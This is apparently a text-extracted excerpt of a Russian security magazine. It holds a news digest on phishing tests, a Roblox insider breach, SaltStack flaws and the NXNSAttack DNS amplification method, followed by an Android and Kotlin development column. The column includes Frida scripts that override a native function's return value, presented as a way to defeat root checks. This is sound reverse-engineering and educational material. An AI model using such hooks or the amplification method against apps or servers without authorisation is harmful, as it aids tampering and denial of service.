   на дому сотрудники устойчивы перед фишин говыми атаками. Как выяснилось, каждый
  пятый сотрудник согласился ввес ти свои учетные данные на поддельной странице логина.

   Специалисты GitLab Red Team разослали 50 фишинговых электронных писем. В ито ге 17 (34%)
   получателей нажали на ссылку в сообщении, перейдя на спе циальный фишинговый сайт.
   Из них еще 10 человек (59% из тех, кто перешел на сайт, и 20% от общей тестиру емой груп‐
   пы) продолжили работу и ввели на фальшивой странице свои учетные данные.





   При этом лишь 6 из 50 получателей фишин говых сообщений  (12%) сообщили о попытке
  фишинга сотрудникам службы безопасности GitLab.

  →«Изначально команда [Red Team] предполагала, что на эту фишинговую удочку попадется
   больше людей, но это предположение оказалось неверным. Некоторые вендоры утверждают,
   что средний показатель успешности фишин говых атак равняется примерно 30–40%, поэтому
   приятно видеть, что мы держимся ниже этого уровня», — говорит вице‐президент GitLab
   по безопасности Джонатан Хант.





 ПОДКУП ПОДРЯДЧИКА
 ROBLOX
  На связь с журналистами издания Vice Motherboard вышел человек, подкупив‐
  ший сотрудника поддержки Roblox. Он расска зал, что купил себе доступ
   к внутренней панели поддержки кли ентов популярной игры, нас читыва‐
  ющей 100 миллионов активных пользователей в месяц. В качестве доказа‐
   тельства своих слов хакер предос тавил изда нию скриншоты.
    Напомним, что Roblox дос тупна на ПК, Xbox и мобильных устрой ствах.
  Пользователи могут создавать свои собственные игры на базе платформы
  или играть в созданные другими. При этом Roblox активно использует мик‐
  ротранзакции: можно приобретать game pass’ы или кос метичес кие предметы
  за внутриигровую валюту. Раз работчики игр Roblox также могут зарабатывать
  реальные деньги на своих творениях. Игра особенно популярна среди детей,
  имеет большое и активное сообщес тво на YouTube.
    С приобре тен ным за неизвестную сумму дос тупом хакер, пожелавший
   остаться неизвестным, получил возможность искать личную информацию
  пользователей, видеть их email‐адреса, менять пароли, отключать двух‐
  факторную аутентификацию, банить пользователей и делать многое другое.
   Хотя хакер имел доступ к данным множества поль зователей, похоже, он огра‐
  ничился лишь несколькими учетными записями.
     Скриншоты, предоставленные изда нию, содержали личную информацию
  некоторых наиболее известных пользователей платформы, например ютю‐
  бера  Linkmon99. Он  считается «самым богатым» игроком —  владеет
  наибольшим числом игро вых предметов.


                                        Продолжение статьи →
← Начало статьи





  Сам Linkmon99 подтвердил журналис там, что фигурирующий на скриншотах
  адрес электронной поч ты действитель но принадлежит ему. Ящик был создан
  специально для учетной записи Roblox и хра нился в строжайшем секрете, так
   как однажды учетку Linkmon99 уже взламыва ли. Хуже того: как сообщил изда‐
  нию игрок, хакер уже свя зывался с ним, демонстри руя, что знает тот самый
   email‐адрес, узнать который, по сло вам Linkmon99, злоумышленнику было
  попросту неоткуда.
     «Я сделал это, чтобы доказать им свою точку зрения», — заявил хакер,
  общаясь в чате с журналис тами. Он рассказал, что хотел наглядно про‐
  демонстрировать разработчикам риски, которые создают инсайдеры c дос‐
  тупом к пользовательским данным, а также подчеркнул, что Roblox име ет
  огромную аудиторию среди несовершеннолетних, то есть третьи лица могут
   получить доступ к данным детей.
    Дело в том, что вначале хакер вообще пытался получить bug bounty от раз‐
  работчиков Roblox, хотя действо вал он определенно вне рамок закона. Так,
  исходно он заплатил неизвестную сумму инсайдеру за поиск пользователь‐
   ских данных (на LinkedIn этот человек числится как подрядчик, работающий
  над внутриигровой поддержкой Roblox) и уже после этого атаковал службу
  поддержки.
    Первоначально злоумышленник и вовсе заявил журналистам, что исполь‐
  зовал фишинг и взломал сотрудника Roblox, чтобы получить доступ к бэкенду
  поддержки клиентов. Но затем он «изменил показа ния» и сообщил, что вос‐
  пользовался неким багом, связанным с аутентифика цией.
     Представите ли Roblox заверили Vice Motherboard, что никакой уязвимости
  не существует, а действия хакера оха рактеризо вали как фишинговую атаку
  с применением социальной инженерии. Разработчики подчеркну ли, что пре‐
  дупредили о действиях этого человека специалистов HackerOne, так как bug
   bounty программа платформы работа ет именно там.
     Также в компании уверяют, что уже приняли меры для решения воз никшей
  проблемы и адресно уведомили небольшое количес тво пострадавших кли‐
   ентов, до чьих учетных записей успел доб рать ся взломщик.
     Хакер же понял, что не получит денег за «уязвимость», и принялся вре дить:
  сменил пароли для нескольких учет ных записей, украл и продал чужие внут‐
  риигровые предметы. На одном из его скрин шотов также вид но успешное
  изменение настроек  двухфакторной аутентификации для чужой  учетной
   записи.


 ФИШИНГ В РОССИИ И В МИРЕ

   Аналитики компании Group‐IB рассказали, что в 2019 году компания заблокиро вала более
   14 000 фишинговых ресурсов, а это втрое больше, чем годом ранее.

   Среди ключевых тенденций прошлого года эксперты CERT‐GIB отметили смещение фокуса атак
   на пользователей облачных хранилищ как в B2C‐, так и в B2B‐сегменте, а так же переход
   фишеров от создания единичных мошеннических страниц на целые «сетки» сайтов под опре‐
   деленные бренды, что обеспечивает неп рерывность их фун кционирования и устойчивость
   к блокировкам.

   Во второй половине 2019 года CERT‐GIB заблокиро вал 8506 фишинговых ресурсов, в то вре мя
   как годом ранее этот показатель составлял 2567. В целом в 2019 году было заблокиро вано
   14 093 фишинговых страницы, а годом ранее — 4494.





  В прош лом году наибольшее количество фишинговых страниц было нацеле но на онлайн‐сер‐
   висы (29,3%), облачные хранилища (25,4%) и финансовые организации (17,6%).

   2019 год ознаменовал собой смену страны — лидера по хос тингу фишин говых ресурсов: США
     (27%), которым принадлежало пер венство на протяжении пос ледних нескольких лет, усту пили
   место России (34%). Обладатель третьего места на этом пьедестале остался неизменным —
   «бронзу» удерживает Па нама, на нее пришлось 8% блокиро вок.





   Что до фишинговых писем, в большинстве случаев (98%) вредоно сы скрывались в почтовых
   вложениях, и лишь 2% фишин говых писем содер жали ссыл ки, ведущие на загрузку вредонос‐
   ных объектов.

  В архивах доставлялось около 70% всех вредонос ных объектов, в основном для этого исполь‐
   зовались форматы RAR (29%) и ZIP (16%).





                Топ‐10 угроз из фишинговых рассылок и рас ширений вредоносных вложений





 EBAY СЛЕДИТ ЗА ТОБОЙ
  ИБ‐эксперты и журналис ты Bleeping Computer обна ружили, что сайт ebay.com
   сканирует локальные порты посетителей в поис ках приложе ний для удален‐
  ной поддержки и удаленного доступа. Многие из этих портов связаны
  с такими инструментами, как Windows Remote Desktop, VNC, TeamViewer,
  Ammy Admin.
     Скрипт check.js  (архивная копия) пыта ется подключиться к следующим
  портам:





  Сканирование выполняет ся с использовани ем WebSockets для подключения
   к 127.0.0.1. Все четыр надцать ска нируемых портов и связанные с ними прог‐
  раммы перечислены в таб лице ниже.





  Первым на эту странность обра тил внимание ИБ‐специалист, известный
  под псевдонимом Nullsweep. Он отмечал, что, если открыть сайт с Linux‐
  машины, сканирование не ведется. В общем‐то, это логично, ведь все ска‐
  нируемые программы — это средства уда лен ного дос тупа для Windows.
    Журналисты Bleeping Computer пишут, что впервые услышали о скрипте,
   сканирующем порты, от специалиста Darknet Diaries Джека Рисайдера. Тот
  высказал предположение, что сканирование портов может делаться с целью
  доставки рекламы, фингерприн тинга или же для защиты от мошенничес тва.
     Скорее все го, так действитель но пытаются обнаружить скомпромети‐
  рованные компьютеры, которые используются для мошенничества на eBay.
  Дело в том, что еще в 2016 году зло умышленники с помощью TeamViewer зах‐
  ватывали чужие машины, опус тошали счета PayPal и заказывали товары с eBay
  и Amazon.
     Теорию о борьбе с мошен никами подтверждает еще один ИБ‐эксперт,
  Дэн Немек, который написал о странной активнос ти eBay большую статью.
  Немек проследил исполь зуемый аукционом скрипт до продукта ThreatMetrix,
  который создан компанией LexisNexis и предназначен для обнаруже ния
  мошенников. И хотя сканер eBay, по сути, ищет известные и легитимные прог‐
  раммы, в прошлом некоторые из них дей ствитель но при меняли в качестве
  RAT в фишинговых кампаниях.
     Представите ли eBay огра ничились весь ма обтекаемым комментарием.
   Так, на вопрос журналистов Bleeping Computer о сканировании портов
  посетителей в компании ответили следующее:



         «Конфиденциальность и данные наших клиентов  являются нашим
         глав ным приоритетом. Мы стре мим ся соз дать на наших сайтах и сер-
         висах атмосфе ру безопас ности, удобс тва и надежности».


  БЕЗОПАСНОСТЬ IOS: ПОТРАЧЕНО
   Компания Zerodium, известный брокер уязвимос тей, сообщила, что в ближайшие месяцы
   не будет приобретать новые эксплоиты для уязвимос тей в iOS, так как предложение на них
   превысило спрос. Так, ком пании не нужны LPE (локальное повыше ние привиле гий) для Apple
   iOS, RCE (удаленное выполнение кода) для Safari или баги, допускающие побег из песочницы.





   Глава Zerodium Чауки Бекрар в личном Twitter проком ментировал происхо дящее так:

  →«Безопасность iOS про*ана. Только PAC [Pointer Authentication Codes] и отсутствие пос‐
   тоянного присутствия  (ориг.  non‐persistence. — Прим.  ред.) в сис теме удерживают ее
   от падения до нуля... но мы видим много экс плоитов для обхода PAC, а также есть несколько
   эксплоитов (0day), работа ющих со всеми iPhone/iPad. Остается наде яться, что iOS 14 будет
   лучше»
  — Чауки Бекрар





 УЯЗВИМОСТЬ
 SALTSTACK SALT
  Эксперты компании  F‐Secure обна ружи ли две  критические  уязвимости
   в опенсорсном фреймворке SaltStack Salt, который широко используется
   в дата‐центрах и облачных серверах. Обе проб лемы набрали 10 бал лов
  из 10 возможных по шка ле оценки уязвимостей CVSS, и обе допускают уда‐
  ленное выполнение произвольного кода.
     Уязвимости  получили  идентификаторы  CVE‐2020‐11651  и  CVE‐2020‐
  11652 и позволяют злоумышленнику выполнить произвольный код на удален‐
  ных серверах в дата‐центрах и облачных средах.
      Так, одна уязвимость представляет собой обход аутентификации: неаутен‐
  тифицированным сетевым клиентам по ошиб ке предлагалась полная функци‐
  ональность. В некото рых случаях ата кующий мог даже получить токен
  для доступа с правами root к master‐серверу и выполнять произвольные
  команды на серверах с активным демоном salt‐minion.
     Второй баг — это обход катало га, возникший из‐за некорректной очистки
  недоверенных входных данных, что в результате обеспечивало неограничен‐
  ный доступ ко всей файловой системе сервера с root‐правами. Для исполь‐
  зования уязвимости необходима аутентификация, но получить ее можно
  через эксплуатацию проблемы CVE‐2020‐11651.
    В настоящее время пат чи для опас ных багов уже доступны, но еще недав‐
  но в Сети можно было обнаружить более 6000 потенциально уязвимых сис‐
   тем, а эксплуатация уязвимостей оказалась очень проста.
     Так как SaltStack Salt широко используется в дата‐центрах и облачных сер‐
   верах, эксперты F‐Secure предупреждали о том, что грядут большие проб‐
  лемы.  К  сожале нию,  их  предостережения  полностью  оправдываются.
  При помощи этих уязвимостей в мае 2020 года были атакованы:
   • инфраструктура LineageOS, мобильной операци онной сис темы на базе
      Android, используемой для смартфо нов, планшетов и телевизионных прис‐
      тавок;
   • блогинговая платформа Ghost;
   • удостоверяющий центр Digicert;
   • Xen Orchestra, веб‐интерфейс для визуализации и админис трирования
     хостов XenServer (или XAPI);
   • поисковый сер вис Algolia, который предос тавля ет поисковые услуги круп‐
    ным сайтам (в том числе Twitch, Hacker News, Stripe).

  Судя по всему, все перечисленные инциденты — дело рук опе раторов бот‐
  нета Kinsing. К примеру, издание ZDNet ссылает ся на собственные источники
   в ИБ‐сообществе и пишет, что операторы Kinsing были первыми, кто начал
   эксплуатировать уязвимос ти в SaltStack Salt. Они устанавливают бэкдоры
  и разворачивают майнеры на взло манных серверах.
    В настоящее время ботнет все еще продолжает свои атаки, но теперь
  проблемы в SaltStack Salt ста ли использовать и другие хак‐группы. ИБ‐спе‐
  циалисты прогнозируют, что в ближай шие недели атаки будут только уси‐
   ливаться, так как PoC‐экс плоиты для уяз вимости обхода аутентификации
   (CVE‐2020‐11651) уже опуб ликова ны в открытом доступе, в том числе
  на GitHub.


  150 МИЛ ЛИОНОВ ЧЕЛОВЕК ОТКАЗАЛИСЬ ОТ ПАРОЛЕЙ


   Компания Microsoft подели лась интерес ной статистикой использования паролей. По данным
   аналитиков, все больше людей отказываются от традиционных паролей и предпочитают им
   альтернативные решения для аутентификации.


   Количество  пользователей,  применяющих  «бес парольные»  решения  Microsoft,  достигло
   150 000 000 (по сравнению со 100 000 000 в ноябре 2019 года). Эта цифра охватывает
   пользователей онлайн‐сервисов ком пании, таких как Azure, GitHub, Office и Xbox.

   Статистика компании включает пользователей, полагающихся в работе на решение Windows
   Hello (распознавание отпечатков пальцев и лиц) для дос тупа к Azure Active Directory, а так же
   пользователей, которые применяют приложение Microsoft Authenticator и ключи
   с поддержкой FIDO2 для входа в различные учетные записи без паролей.





 NXNSATTACK
  Команда израильских ИБ‐специалис тов рас ска зала о новой DNS‐проблеме
   NXNSAttack, которая может использоваться для значительной амплификации
  DDoS‐атак.
    Проблема влияет на рекурсивные DNS‐серверы, а также делегирование
  DNS. И хотя атаки NXNSAttack могут быть реализованы по‐разному, основные
  шаги в любом случае будут одинако выми:
   • Злоумышленник отправляет DNS‐запрос на рекурсивный DNS‐сервер.
     Запрос для домена, типа attacker.com, который управляется через под кон‐
     трольный хакеру авторитативный DNS‐сервер.
   • Так как рекурсивный DNS‐сервер не авто ризован резол вить этот домен,
     он перенаправит операцию вредонос ному DNS‐серверу злоумышленника.
   • Вредоносный DNS‐сервер отвечает рекурсивному DNS‐серверу, заявляя,
      что делегирует операцию резолвинга DNS длинному спис ку name‐сер‐
     веров. Этот список содержит тысячи поддоменов для сайта жертвы.
   • Рекурсивный DNS‐сервер перенаправляет DNS‐запрос всем поддоменам
     в этом списке, создавая огромную нагрузку на авторитативный DNS‐сер‐
     вер жертвы.





  В итоге злоумышленник, экс плуатирующий проб лему NXNSAttack, может
  добиться амплификации прос того DNS‐зап роса в 2–1620 раз по сравнению
  с его первоначальным раз мером. Такая наг рузка способна привес ти к сбою
  DNS‐сервера  жертвы,  а  когда  DNS‐сервер  отключится,  пользователи
  не попадут на атакованный сайт, так как домен сайта резолвится не сможет.
     Эксперты пишут, что коэффициент амплифика ции пакетов будет зависеть
   от конкретного ПО, работающего на рекурсивном DNS‐сервере, но в боль‐
  шинстве  случаев амплифика ция  окажется во много  раз больше, чем
  при использовании других методов.
    По мнению авторов NXNSAttack, в настоящее вре мя такие DDoS‐атаки
  среди наиболее опасных, ведь зло умышленники могут проводить затяжные
  и мощные кампании, автоматизиро вав DNS‐запросы и имея в своем рас‐
  поряжении все го несколь ко устройств.
    Перед проблемой NXNSAttack уязвимы ISC BIND (CVE‐2020‐8616), NLnet
  Labs Unbound (CVE‐2020‐12662), PowerDNS (CVE‐2020‐10995), а  также
  CZ.NIC Resolver Knot (CVE‐2020‐12667) и коммерческие DNS‐сервисы таких
   крупных компаний, как Cloudﬂare, Google, Amazon, Microsoft, Oracle (DYN),
   Verisign, IBM Quad9 и ICANN.





  На протяже нии последних нескольких месяцев эксперты тесно сотрудни чали
  с производителями ПО для DNS, сетями дос тавки контента и DNS‐провай‐
  дерами, чтобы обезопасить от NXNSAttack DNS‐серверы по всему миру.
     Патчи для уязвимостей NXNSAttack активно выпус каются уже несколько
   недель, и они призваны предотвра тить злоупотребление процессом делеги‐
  рования DNS. Администраторам рекомендуется как можно скорее обновить
  ПО своего DNS‐резол вера до последней версии.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Европол сообщил об аресте членов польской хак‐группы Inﬁnity Black


   Немецкие власти обвинили рос сийского хакера во взломе Бун дестага в 2015 году


   Восемь лет ботнет Cereals существовал лишь с одной целью: скачивать аниме


   Хакер получил доступ к GitHub‐репозиториям Microsoft


   Власти США опубликовали список самых эксплуатируемых уязвимос тей


   Малварь Mandrake скрывалась в Google Play более четырех лет


  В открытом доступе нашли дан ные нарушителей самоизоляции


   Bluetooth‐атака BIAS угрожает устройствам с прошивками Apple, Broadcom, Cypress,  Intel,
   Samsung


   СБУ арестовала хакера Sanix, тор говавшего терабайтами пользовательских данных


   Появилась версия Raspberry Pi 4 с 8 Гбайт ОЗУ
HEADER



                   ИССЛЕДОВАНИЕ
                            IPC ANDROID
                       И ХУКИНГ
                       НАТИВНЫХ
                       БИБЛИОТЕК


ANDROID





Сегодня  в  выпуске:  исследование  IPC‐
механизмов Android, хукинг натив ных биб‐
лиотек с помощью Frida, правильный спо‐
соб завершения короутин в Kotlin, введение
в Kotlin Flow и StateFlow, перегрузка опе‐          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
раторов в Kotlin, оператор Elvis и основы              zobnin@glc.ru
функционального      программирова ния.
А также подборка инструментов пентестера
и библиотек для разработчиков.


                ПОЧИТАТЬ


Как устро ена система сооб щений в Android
Android IPC: Part 2 — Binder and Service Manager Perspective — статья о Binder,
одной из ключевых технологий Android.
  Вопреки расхожему мнению, Android с самых первых версий использовал
песочницы для изоляции приложений. И реализованы они были весьма инте‐
ресным способом. Каждое приложение запускалось от име ни отдельного
пользователя Linux и, таким образом, имело доступ только к своему каталогу
внутри /data/data.
   Друг с другом и с операционной системой приложения могли общаться
только через IPC‐механизм Binder, который требовал авторизации для выпол‐
нения того или иного действия. В Android Binder использовался и продол жает
использоваться буквально для всего: от запуска приложений до вызова фун‐
кций операционной системы.
  Операционная система спроектирова на так, что пользователи и даже
программисты не догадываются о существо вании какого‐то IPC‐механизма.
Если программист хочет ско пиро вать текст в буфер обмена, он просто
получает ссылку на объект‐сервис и вызыва ет один из его методов.
Под капотом фреймворк преобразует  этот вызов в сообщение  Binder
и отправляет его в ядро через файл‐устройство /dev/binder. Это сооб‐
щение перехватывает Service manager, который находит в своем каталоге
сервис буфера обмена, проверяет полномочия приложения на отправку ему
сообщений и, если оно имеет все необ ходимые пра ва, передает сообщение
сервису. После получения и обработки сооб щения сервис буфера обме на
отправляет ответ, исполь зуя тот же Binder.
  Кроме полномочий, Service manager также проверяет, имеет ли приложе‐
ние право на создание сервиса и может ли оно использовать ряд опасных
сервисов. И первое, и вто рое — про веряя зна чение UID (идентификатор
пользователя) вызывающего про цес са. Если UID больше 10 000 — приложе‐
ние не имеет права регистрировать новый сервис (все сторонние приложе‐
ния в Android получают UID больше 10 000), а если UID находится в рай‐
оне 99 000–99 999, приложение получает огра ничение на использование
«опасных» сервисов. Именно в  эту груп пу попадают вкладки браузе ра
Chrome.


Ху кинг нативных биб лиотек с помощью Frida
How to hook Android Native methods with Frida (Noob Friendly) — статья о перех‐
вате функций нативных библиотек с помощью Frida.
  Для начала файл APK следует развернуть. Это обычный архив ZIP, поэтому
можно использовать любой архиватор. Каталог lib содержит набор нативных
библиотек для различных архитектур. Находим биб лиотеку для архитектуры
своего смартфона (обычно это arm64‐v8a или armeabi‐v7a) и анализируем
ее содержимое с помощью утилиты nm (она доступна в Linux и macOS):


$ nm ‐‐demangle ‐‐dynamic libnative‐lib.so
00002000 A __bss_start
         U __cxa_atexit
         U __cxa_finalize
00002000 A _edata
00002000 A _end
00000630 T Java_com_erev0s_jniapp_MainActivity_Jniint
000005d0 T Jniint
         U rand
         U srand
         U __stack_chk_fail
         U time

Как видно, библиотека содержит в том числе функцию Java_com_erev0s_j‐
niapp_MainActivity_Jniint. Судя по имени, она дол жна быть доступна
для вызова из Java (на стороне Java она будет иметь имя com.erev0s.
jniapp.MainActivty.Jniint).
  Допустим, наша задача — перехватить вызов функции и вернуть удобное
нам значение. Например, если бы это была функция, проверя ющая наличие
root, мы бы могли перехватить ее и вернуть false, невзирая на реальный
результат провер ки.
   Есть два способа перехватить эту функцию:
 1. На стороне Java, когда приложение только попытается выз вать нативную
  функцию.
 2. На стороне нативного кода, когда управление уже будет передано биб‐
   лиотеке.

Предположим, мы уже установили Frida на ПК и frida‐server на смартфон (как
это сделать, можно про читать здесь). Теперь напишем такой скрипт:


Java.perform(function () {
    var Activity = Java.use('com.erev0s.jniapp.MainActivity')
    Activity.Jniint.implementation = function () {
        return 80085
    }
})

Этот скрипт переписыва ет функцию Jniint класса com.erev0s.jniapp.
MainActivity так, чтобы она всег да возвращала зна чение 80 085.
  Сохраняем  скрипт  в  файл  myhook.js  и  запус каем  приложение
под управлением Frida:


$ frida ‐U ‐l myhook.js com.erev0s.jniapp

Перехватить нативную функцию еще проще:


Interceptor.attach(Module.getExportByName('libnative‐lib.so', 'Java_c
om_erev0s_jniapp_MainActivity_Jniint'), {
    onEnter: function(args) {},
    onLeave: function(retval) {
      retval.replace(0)
    }
})





                    Результат работы скрипта


              РАЗРАБОТЧИКУ


Как правильно завершать коро утины
Cancellation in coroutines — статья о работе с Kotlin Coroutines, а точнее о том,
как правильно их завершать.
  Существует два основных способа завершить коро ути ны. Первый — через
завершение CoroutineScope, которому принадлежат короутины:


val job1 = scope.launch { … }
val job2 = scope.launch { … }


scope.cancel()

Второй — прямое завершение отдельно взятых коро утин:


val job1 = scope.launch { … }
val job2 = scope.launch { … }


job1.cancel()

Вроде бы все просто. Но есть нес колько неочевидных моментов:
 1. Завершение коро утины должно быть кооперативным. Сам по себе метод
  cancel() не завершает коро утину, а лишь посылает ей сигнал завер‐
   шения. Короутина дол жна сама проверить, получи ла ли она его, используя
   поле Job.isActive и метод ensureActive() . Первое будет содержать
    false, если сигнал завершения при шел, второй выбросит Cancella
  tionException.
 2. Все стандартные suspend‐функции пакета kotlinx.coroutines (with
  Context() , delay() и так далее) умеют реагировать на сигнал завер‐
   шения, поэтому при их использовании программис ту необязательно
   делать это самостоятель но.
 3. При завершении коро утины ее родитель получа ет исключение Cancella
  tionException.
 4. Завершенный CoroutineScope больше нельзя использовать для запус ка
   короутин.


Swift guard про тив Kotlin Elvis
Why Kotlin’s Elvis Operator is Better Than Swift’s Guard Statement — заметка
о том, почему языковые конс трукции для защиты от разыменования null‐
переменной в Kotlin лучше, чем в Apple Swift.
   Все, кто программировал на Swift, должны знать о ключевом слове guard:


func process(couldBeNullMesage: String?) {
    guard let notNullMessage = couldBeNullMesage else { return }
    printMessage(notNullMessage)
}


func printMessage(message: String) {
    print(message)
}

Guard защищает от присвоения зна чения null переменной, которая не может
быть null. В данном слу чае функция process() будет завершена, если аргу‐
мент couldBeNullMesage равен null.
   Теперь посмотрим, как сделать то же самое в Kotlin с помощью четырех
разных способов (от худшего к лучшему).


1. Ключевое сло во let

fun process(couldBeNullMesage: String?) {
    couldBeNullMesage?.let {
        printMessage(it)
    }
}


fun printMessage(message: String) {
    println(message)
}

Это выбор новичков. Способ хорошо работа ет, но создает допол нительные
отступы.


2. Опе ратор Elvis

fun process(couldBeNullMesage: String?) {
    val notNullMessage = couldBeNullMesage ?: return
    printMessage(notNullMessage)
}


fun printMessage(message: String) {
    println(message)
}

Результат идентичен работе оператора guard, но сама запись короче.


3. Старый доб рый if-else

fun process(couldBeNullMesage: String?) {
    if (couldBeNullMesage == null) return
    printMessage(couldBeNullMesage)
}


fun printMessage(message: String) {
    println(message)
}

Компилятор Kotlin достаточно умный, чтобы понять, что в функции printMes‐
sage используется переменная, которая уже не может быть null.


4. И сно ва опе ратор Elvis

fun process(couldBeNullMesage: String?) {
    couldBeNullMesage ?: return
    printMessage(couldBeNullMesage)
}


fun printMessage(message: String) {
    println(message)
}

Здесь мы совместили лаконичность операто ра Elvis и автоматического при‐
ведения типов из предыдущего примера.


Ито го

// Swift
guard let notNullMessage = couldBeNullMesage else { return }
// Kotlin
couldBeNullMesage ?: return


Удоб ное логиро вание
Android Logging on Steroids: Clickable Logs With Location Info — заметка о том,
как сделать логи более информа тивными и приятными для чтения.
  Все знают, как выглядят стектрейсы в логах Android при падении приложе‐
ния. Ты сразу получаешь ссылку на файл, а после клика попадаешь на нужную
строку в этом файле. Почему бы не сделать то же самое с обычными отладоч‐
ными лог‐сообщениями?
  Нам понадобится библиотека логирования Timber. Подключаем ее к про‐
екту:


implementation 'com.jakewharton.timber:timber:4.7.1'

Далее добавляем в метод onCreate() при ложения сле дующие строки:


class HyperlinkedDebugTree : Timber.DebugTree() {
    override fun createStackElementTag(element: StackTraceElement):
String? {
        with(element) {
            return "($fileName:$lineNumber) $methodName()"
        }
    }
}


Timber.plant(HyperlinkedDebugTree())

Это все, теперь все вызовы Timber.d() будут формировать логи со ссыл кой
на исходный код.
   Чтобы сде лать жизнь еще проще, создадим следующую функцию‐рас‐
ширение:


inline fun Any?.log(prefix: String = "object:") = Timber.d("$prefix
${toString()}")

Теперь содержимое любой переменной (например, id) можно вывести в лог
таким образом:


id.log()




                                     Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
           ANDROID
             ИССЛЕДОВАНИЕ IPC ANDROID И ХУКИНГ
                         НАТИВНЫХ БИБЛИОТЕК





Вве дение в Kotlin Flow
Into the Flow: Kotlin cold streams primer — одна из лучших статей о новой воз‐
можности Kotlin под названием Flow.
  В Kotlin уже есть мощный механизм асин хронного программирования
под названием коро утины (coroutines). Они поз воляют писать чистый асин‐
хронный неблокируемый код, пос тро енный на последовательном вызове
функций. Например, мы можем объявить такую функцию:


suspend fun doSomething(): List<Something>

Допустим, она будет выполнять сложные расчеты в фоне, а затем вернет
результат в виде списка. Это отлично работает, за исключением того, что
функция должна заранее выполнить рас чет всех элементов списка. Если эле‐
ментов слишком много или мы имеем дело с неоп ределенным количеством
элементов, начинаются проблемы.
  Для их решения в Kotlin есть дру гой инс трумент под названием Flow
(поток):


fun doSomething(): Flow<Something>

Обрати внимание, что при объявлении функции мы не использовали клю‐
чевое слово suspend. Это потому, что на самом деле, какой бы сложной
ни была функция, при запус ке она ничего не дела ет и сразу воз вращает
управление. Фун кция начина ет работать только после того, как мы вызовем
метод collect() полученного от функции объекта. Например:


flow.collect { something ‐> println(something) }

Именно поэтому разработчики Kotlin называют потоки холодными, в противо‐
вес горячим каналам (Channel), которые также присутствуют в язы ке.
  Для создания самого потока можно использовать функцию flow:


fun doSomething(): Flow<Int> = flow {
    for (i in 1..3) {
        delay(100)
        emit(i)
    }
}

В данном случае функция «выпус кает» в поток три объекта типа Int с переры‐
вом в 100 миллисекунд. Обра ти внимание, что flow — это suspend‐функция,
которая может запускать дру гие suspend‐функции (в данном случае delay()).
   Как уже было сказано выше, функция, воз вра щающая поток, не должна
быть suspend‐функцией. Но метод collect() объекта типа Flow — suspend‐
функция, которая дол жна работать внутри CoroutineScope:


val something = doSomething()


viewModelScope.launch {
    something.collect { value ‐> println(value) }
}

Создать поток можно и дру гими способами, например с помощью метода
asFlow():


listOf(1,2,3).asFlow()
(1..3).asFlow()

Чтобы завершить поток, есть нес колько путей — от вызова collect()
до методов типа first(), fold(), toList(), знакомых тебе по работе с кол‐
лекциями.
  Сам  поток можно  трансформировать,  чтобы  получить новый  поток
с помощью методов map(), filter(), take():


(1..3).asFlow()
    .transform { number ‐>
        emit(number*2)
        delay(100)
        emit(number*4)
    }
    .collect { number ‐> println(number) }

По умолчанию функции flow и collect запускаются внутри текущего Corouti‐
neScope, но его можно изменить, используя метод flowOn():


fun doSomething(): Flow<Int> = flow {
    // Этот код будет выполнен внутри Dispatchers.IO (фоновый поток)
    for (i in 1..3) {
        delay(100)
        emit(i)
    }
}.flowOn(Dispatchers.IO)


[...]


viewModelScope.launch {
    doSomething().collect { value ‐>
        // Этот код будет выполнен внутри основного потока приложения
        print (value)
    }
}

Несколько потоков можно объединить в один с помощью метода zip():


val flowA = (1..3).asFlow()
val flowB = flowOf("one", "two", "three")
flowA.zip(flowB) { a, b ‐> "$a and $b" }
     .collect { println(it) }

Этот код объединит каждый элемент первого потока с соответству ющим эле‐
ментом второго потока:


1 and one
2 and two
3 and three

Другой вариант объединения — функция combine():


al flowA = (1..3).asFlow()
val flowB = flowOf("single item")
flowA.combine(flowB) { a, b ‐> "$a and $b" }
     .collect { println(it) }

В данном случае каждый элемент первого потока будет объ единен с пос‐
ледним элементом второго потока:


1 and single item
2 and single item
3 and single item

После трансформации потоков мы можем получить структуры данных, вклю‐
чающие в себя потоки потоков (Flow<Flow<X>>). Чтобы «выровнять» такие
данные, можно исполь зовать один из следующих методов:
 • flatMapConcat() — возвра щает поток, который возвращает все эле‐
  менты первого вложенного потока, затем все элементы второго потока
   и так далее;
 • flatMapMerge() — возвра щает поток, в который попадают элементы
   из всех вложен ных потоков в порядке очередности;
 • flatMapLatest() — воз вра щает последний вложенный поток.


Kotlin Flow и StateFlow
StateFlow, End of LiveData? — статья о StateFlow, новом классе биб лиотеки
короутин Kotlin (начиная с 1.3.6) для хра нения сос тояний.
  Сразу начнем с примера:


fun main() = runBlocking {
    val stateFlow = MutableStateFlow<Int>(0)


    // Следим за изменением состояния
    val job = launch {
        stateFlow.collect {
            print("$it ")
        }
    }


    // Изменяем состояние
    (1..5).forEach {
        delay(500)
        stateFlow.value = it
    }


    job.cancel()
    job.join()
}

StateFlow базируется на потоках и позволяет разным компонентам при ложе‐
ния менять состояние и реагировать на изменение этого состояния.
  В Android StateFlow можно использовать в качестве более продвинутого
аналога LiveData. Создадим, нап ример, следующую ViewModel:


@ExperimentalCoroutinesApi
class MainViewModel : ViewModel() {
    private val _countState = MutableStateFlow(0)


    val countState: StateFlow<Int> = _countState


    fun incrementCount() {
        _countState.value++
    }


    fun decrementCount() {
        _countState.value‐‐
    }
}

Теперь создадим активность, использующую эту модель. Активность будет
состоять из TextView, показывающего число, и двух кнопок для увеличения
и уменьшения этого числа:


class MainActivity : AppCompatActivity() {
    private val viewModel by lazy {
        ViewModelProvider(this)[MainViewModel::class.java]
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        initCountObserver()
        initView()
    }
}


private fun initCountObserver() {
    lifecycleScope.launch {
        viewModel.countState.collect { value ‐>
            textview_count.text = "$value"
        }
    }
}


private fun initView() {
    button_plus.setOnClickListener(::incrementCounter)
    button_minus.setOnClickListener(::decrementCounter)
}


private fun incrementCounter(view: View) {
    viewModel.incrementCount()
}


private fun decrementCounter(view: View) {
    viewModel.decrementCount()
}

Это все. Нажатие кнопки изменения числа изменит состояние ViewModel,
а это, в свою очередь, приведет к автомати чес кому изменению TextView.
И все это работает с учетом жизненного цикла активности благодаря исполь‐
зованию lifecycleScope.


Основы фун кционального программирования на Kotlin
Functional Programming in Kotlin — серия статей о функциональном прог‐
раммировании на Kotlin.
